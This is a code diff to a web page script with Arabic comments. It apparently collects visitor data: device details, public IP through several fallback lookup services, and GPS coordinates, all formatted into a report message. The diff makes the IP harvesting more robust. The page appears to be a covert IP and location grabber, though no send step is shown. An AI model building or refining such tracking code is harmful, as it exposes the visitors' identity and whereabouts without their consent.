@@ -159,8 +159,6 @@
         // جمع معلومات الأجهزة بشكل سريع
         function getQuickHardwareInfo() {
             return {
-                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
                 maxTouchPoints: navigator.maxTouchPoints || 0,
                 vibrationSupport: 'vibrate' in navigator,
                 webglSupport: (() => {
@@ -178,22 +176,38 @@
             };
         }
 
-        // الحصول على IP بشكل سريع
+        // الحصول على IP بشكل سريع مع خدمات متعددة
         async function getIPFast() {
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 ثواني فقط
-                
-                const response = await fetch('https://api.ipify.org?format=json', {
-                    signal: controller.signal
-                });
-                clearTimeout(timeoutId);
-                
-                const data = await response.json();
-                return data.ip;
-            } catch (e) {
-                return 'غير متاح';
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://httpbin.org/ip',
+                'https://icanhazip.com',
+                'https://api.myip.com'
+            ];
+
+            for (let service of ipServices) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2 ثانية لكل خدمة
+                    
+                    const response = await fetch(service, {
+                        signal: controller.signal
+                    });
+                    clearTimeout(timeoutId);
+                    
+                    if (service.includes('icanhazip.com')) {
+                        const ip = await response.text();
+                        return ip.trim();
+                    } else {
+                        const data = await response.json();
+                        return data.ip || data.origin;
+                    }
+                } catch (e) {
+                    console.log(`فشل ${service}:`, e.message);
+                    continue;
+                }
             }
+            return 'غير متاح';
         }
 
         // الحصول على الموقع بشكل سريع
@@ -247,10 +261,8 @@
 🌐 المتصفح: ${data.device.browser}
 📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
 🖥️ الشاشة: ${data.device.screenResolution}
-🧠 المعالج: ${data.hardware.cpuCores} نواة
-💾 الذاكرة: ${data.hardware.deviceMemory}
 📶 الشبكة: ${data.hardware.connectionType}
-🌍 IP: ${data.ip || 'غير متاح'}
+🌍 IP: ${data.ip || 'غير متاح'} ⚠️
 📍 الموقع: ${data.location ? `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}` : 'غير متاح'}
 🕐 المنطقة: ${data.device.timezone}
 🗣️ اللغة: ${data.device.language}
